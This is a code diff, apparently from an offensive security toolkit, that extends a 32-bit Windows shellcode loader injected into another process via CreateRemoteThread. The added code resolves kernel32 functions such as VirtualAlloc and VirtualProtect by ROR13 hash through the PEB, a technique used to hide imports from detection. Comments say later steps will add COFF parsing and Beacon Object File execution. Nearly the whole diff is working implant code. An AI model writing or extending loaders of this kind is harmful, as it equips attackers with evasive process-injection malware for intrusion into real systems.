@@ -35,9 +35,40 @@
 #include "abi.h"
 
 /* ROR13 hashes — same primitive as win/api.ResolveByHash, so the
- * parent's hash matches the loader's. Pre-computed via a tiny Go
- * helper (TestRor13_KnownAnswers in x86fork_present_windows_test.go). */
+ * parent's hash matches the loader's. Pre-computed via the Go
+ * helper TestRor13_KnownAnswers in x86fork_present_windows_test.go;
+ * any rename here MUST land in the Go test in the same commit. */
 #define HASH_EXIT_THREAD          0x60E0CEEFu  /* ExitThread */
+#define HASH_VIRTUAL_ALLOC        0x91AFCA54u  /* VirtualAlloc */
+#define HASH_VIRTUAL_PROTECT      0x7946C61Bu  /* VirtualProtect */
+#define HASH_GET_PROCESS_HEAP     0xA80EECAEu  /* GetProcessHeap */
+#define HASH_HEAP_ALLOC           0x2500383Cu  /* HeapAlloc */
+#define HASH_HEAP_FREE            0x10C32616u  /* HeapFree */
+#define HASH_RTL_MOVE_MEMORY      0xCF14E85Bu  /* RtlMoveMemory */
+
+/* kernel32 function pointer types. All Win32 imports we use are
+ * __stdcall; the typedefs let the resolver-table walker assign
+ * addresses without an unsafe-looking cast. */
+typedef void  __stdcall (*pfn_ExitThread)(uint32_t code);
+typedef void *__stdcall (*pfn_VirtualAlloc)(void *addr, uint32_t size, uint32_t allocType, uint32_t protect);
+typedef int   __stdcall (*pfn_VirtualProtect)(void *addr, uint32_t size, uint32_t newProtect, uint32_t *oldProtect);
+typedef void *__stdcall (*pfn_GetProcessHeap)(void);
+typedef void *__stdcall (*pfn_HeapAlloc)(void *heap, uint32_t flags, uint32_t bytes);
+typedef int   __stdcall (*pfn_HeapFree)(void *heap, uint32_t flags, void *mem);
+typedef void  __stdcall (*pfn_RtlMoveMemory)(void *dst, const void *src, uint32_t len);
+
+/* kapi groups every resolved kernel32 function so the loader can
+ * pass a single pointer around instead of threading 7 args.
+ * Allocated on the loader's stack at entry, filled by resolve_kapi. */
+typedef struct {
+    pfn_ExitThread      ExitThread;
+    pfn_VirtualAlloc    VirtualAlloc;
+    pfn_VirtualProtect  VirtualProtect;
+    pfn_GetProcessHeap  GetProcessHeap;
+    pfn_HeapAlloc       HeapAlloc;
+    pfn_HeapFree        HeapFree;
+    pfn_RtlMoveMemory   RtlMoveMemory;
+} kernel32_api_t;
 
 /* Read 32-bit PEB via fs:[0x30] (WoW64-safe; the 32-bit TIB
  * carries the 32-bit PEB at TIB+0x30).
@@ -106,7 +137,22 @@ static uint32_t resolve_by_hash(uint32_t module_base, uint32_t wanted)
     return 0;
 }
 
-typedef void __stdcall (*pfn_ExitThread)(uint32_t code);
+/* resolve_kapi populates `k` with every kernel32 function pointer
+ * the loader needs. Returns 1 on success, 0 if any export couldn't
+ * be resolved (caller surfaces LOADER_STATUS_RESOLVE_FAIL). */
+static int resolve_kapi(uint32_t k32, kernel32_api_t *k)
+{
+    k->ExitThread     = (pfn_ExitThread)    resolve_by_hash(k32, HASH_EXIT_THREAD);
+    k->VirtualAlloc   = (pfn_VirtualAlloc)  resolve_by_hash(k32, HASH_VIRTUAL_ALLOC);
+    k->VirtualProtect = (pfn_VirtualProtect)resolve_by_hash(k32, HASH_VIRTUAL_PROTECT);
+    k->GetProcessHeap = (pfn_GetProcessHeap)resolve_by_hash(k32, HASH_GET_PROCESS_HEAP);
+    k->HeapAlloc      = (pfn_HeapAlloc)     resolve_by_hash(k32, HASH_HEAP_ALLOC);
+    k->HeapFree       = (pfn_HeapFree)      resolve_by_hash(k32, HASH_HEAP_FREE);
+    k->RtlMoveMemory  = (pfn_RtlMoveMemory) resolve_by_hash(k32, HASH_RTL_MOVE_MEMORY);
+    return k->ExitThread && k->VirtualAlloc && k->VirtualProtect
+        && k->GetProcessHeap && k->HeapAlloc && k->HeapFree
+        && k->RtlMoveMemory;
+}
 
 /* loader entry — CreateRemoteThread targets this address with the
  * params block pointer as lpThreadParameter. The skeleton sets
@@ -130,8 +176,30 @@ uint32_t __stdcall loader_entry(loader_params_t *p)
         p->status = LOADER_STATUS_RESOLVE_FAIL;
         return LOADER_STATUS_RESOLVE_FAIL;
     }
-    pfn_ExitThread exit_th = (pfn_ExitThread)resolve_by_hash(k32, HASH_EXIT_THREAD);
-    if (!exit_th) {
+    kernel32_api_t k;
+    if (!resolve_kapi(k32, &k)) {
+        p->status = LOADER_STATUS_RESOLVE_FAIL;
+        return LOADER_STATUS_RESOLVE_FAIL;
+    }
+
+    /* Step 1.b–1.d will replace the next block with the real
+     * COFF parse + relocate + BOF call sequence using k.*. For
+     * step 1.a, validate the resolve table by exercising a
+     * round-trip through the heap: alloc 16 bytes, free them,
+     * verify both calls returned non-zero. A regression in any
+     * of the 7 resolutions would fail this check inside the
+     * shellcode and surface as LOADER_STATUS_RESOLVE_FAIL. */
+    void *heap = k.GetProcessHeap();
+    if (!heap) {
+        p->status = LOADER_STATUS_RESOLVE_FAIL;
+        return LOADER_STATUS_RESOLVE_FAIL;
+    }
+    void *probe = k.HeapAlloc(heap, 0, 16);
+    if (!probe) {
+        p->status = LOADER_STATUS_RESOLVE_FAIL;
+        return LOADER_STATUS_RESOLVE_FAIL;
+    }
+    if (!k.HeapFree(heap, 0, probe)) {
         p->status = LOADER_STATUS_RESOLVE_FAIL;
         return LOADER_STATUS_RESOLVE_FAIL;
     }
@@ -139,6 +207,6 @@ uint32_t __stdcall loader_entry(loader_params_t *p)
     p->out_len = 0;
     p->err_len = 0;
     p->status  = LOADER_STATUS_DONE;
-    exit_th(LOADER_STATUS_DONE);
+    k.ExitThread(LOADER_STATUS_DONE);
     return LOADER_STATUS_DONE;  /* unreachable */
 }
